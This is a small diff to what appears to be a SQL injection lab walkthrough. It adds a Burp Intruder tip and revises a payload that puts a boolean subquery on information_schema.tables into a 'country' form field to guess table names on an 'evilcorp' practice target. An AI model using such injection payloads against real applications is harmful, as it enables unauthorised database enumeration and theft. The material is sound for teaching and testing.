@@ -244,7 +244,8 @@ name=dbusersguess&country=' OR (SELECT table_name FROM information_schema.tables
 Now, we need to hunt for our table. We will go over the manual method of finding, but first let's practice the guessing method. Our target is hosting an evilcorp homepage,
 maybe there is a table called evilcorp? 
 
-name=evilcorpguess1&country=' OR (SELECT table_name FROM information_schema.tables WHERE table_schema='users' LIMIT 1) = 'evilcorp') -- -
+    You want to intruder this from limit 0,1 to limit 10,1 to see if any of those positions is equal to the name of it. 
+name=evilcorpguess1&country=' OR (SELECT table_name FROM information_schema.tables WHERE table_schema='users' LIMIT 0,1) = 'evilcorp') -- -
 
 Fantastic. Next, can we guess that there is a password column inside this table? 
 
